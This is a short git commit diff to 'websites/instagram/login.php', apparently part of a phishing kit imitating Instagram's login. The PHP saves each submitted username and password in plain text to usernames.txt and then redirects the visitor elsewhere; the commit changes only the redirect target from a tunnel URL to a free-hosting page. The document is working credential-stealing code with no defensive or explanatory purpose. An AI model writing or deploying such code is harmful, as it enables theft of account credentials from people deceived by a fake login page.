f05d42ed243b0f280a85f2077c4205c4a6d49efc
AlmartDev <alonsomartinezcarratala@gmail.com>
2023-12-10 18:16:38 -0800

    Update login.php

--- websites/instagram/login.php
+++ websites/instagram/login.php
@@ -1,6 +1,5 @@
 <?php
 
 file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://serveo.com/4martan/instagram-2');
+header('Location: http://almartan.000webhostapp.com/no-page');
 exit();
-?>
